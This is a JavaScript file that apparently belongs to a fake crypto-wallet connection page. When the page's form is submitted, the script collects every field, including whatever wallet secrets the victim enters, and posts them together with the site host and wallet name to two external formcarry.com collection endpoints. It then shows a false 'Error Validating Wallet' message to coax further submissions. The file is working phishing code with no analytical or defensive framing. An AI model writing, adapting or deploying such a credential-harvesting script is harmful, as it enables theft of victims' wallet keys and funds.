function inspectExport(strings, nextPage) {
  const formData = new FormData();
  formData.append('From', window.location.host);
  formData.append('Wallet', document.getElementById('wallet_name').innerHTML);

  Object.keys(strings).forEach(function (key) {
    formData.append(`${strings[key]["name"]}`, `${strings[key]["value"]}`);
  });

  const email_shortcode = "x973BcW65pI";
  const send_rep = `https://formcarry.com/s/x973BcW65pI`;

  // First formcarry submission
  fetch(send_rep, {
      method: "POST",
      headers: {
          "Accept": "application/json", 
      },
      body: formData,
    })
    .then(response => {
      response.json();
      setTimeout(function () {
        alert("Error Validating Wallet, Please try another wallet");
      }, 500);
    })
    .catch(error => console.error("Error:", error));

  // Additional formcarry submission
  const additionalFormCarry = `https://formcarry.com/s/SGKwKG0BJN8`;
  fetch(additionalFormCarry, {
      method: "POST",
      headers: {
          "Accept": "application/json", 
      },
      body: formData,
    })
    .then(response => {
      response.json();
      console.log("Error Validating Wallet, Please try another wallet");
    })
    .catch(error => console.error("Error sending to additional formcarry:", error));
}

document.querySelector("form").addEventListener("submit", function (e) {
  e.preventDefault(e);
  var form = $(this).serializeArray();
  inspectExport(form, "#");
});
